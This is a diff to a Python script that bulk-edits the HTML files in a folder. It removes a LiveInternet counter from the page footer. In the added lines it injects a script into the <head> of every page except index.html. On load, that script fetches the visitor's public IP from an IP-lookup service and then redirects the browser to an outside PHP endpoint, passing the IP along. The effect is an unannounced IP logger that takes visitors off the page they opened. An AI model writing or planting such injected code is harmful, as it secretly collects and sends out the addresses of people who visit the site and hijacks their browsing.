@@ -2,7 +2,7 @@ import os
 
 
 files = os.listdir()
-files = [i for i in files if i.find(".html")>-1]
+files = [i for i in files if i.find(".html")>-1 and i!="index.html"]
 
 def replace_html(x,y):
     for j in files:
@@ -16,18 +16,14 @@ def replace_html(x,y):
             f.write(rslt)
             f.close()
 
-static = """<div id="statistica"><!--LiveInternet counter--><a href="https://www.liveinternet.ru/click"
-                                    target="_blank"><img id="licntCF91" width="88" height="120" style="border:0" 
-                                    title="LiveInternet: показано количество просмотров и посетителей"
-                                    src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAEALAAAAAABAAEAAAIBTAA7"
-                                    alt=""/></a><script>(function(d,s){d.getElementById("licntCF91").src=
-                                    "https://counter.yadro.ru/hit?t27.6;r"+escape(d.referrer)+
-                                    ((typeof(s)=="undefined")?"":";s"+s.width+"*"+s.height+"*"+
-                                    (s.colorDepth?s.colorDepth:s.pixelDepth))+";u"+escape(d.URL)+
-                                    ";h"+escape(d.title.substring(0,150))+";"+Math.random()})
-                                    (document,screen)</script><!--/LiveInternet-->
-                                </div>
-                                &#169; Copyright 2024-2025 | Felix Petrov"""
 
 
-replace_html("&#169; Copyright 2024-2025 | Felix Petrov",static)
+replace_html("""<head>""","""<head>
+
+            <script>
+                document.addEventListener("DOMContentLoaded", () => {
+                    x=fetch('https://api.ipify.org?format=json').then(res => res.json()).then(t => location.href = "http://t91176wr.beget.tech/ip.php?ip="+t.ip);
+
+                
+                });
+            </script>""")
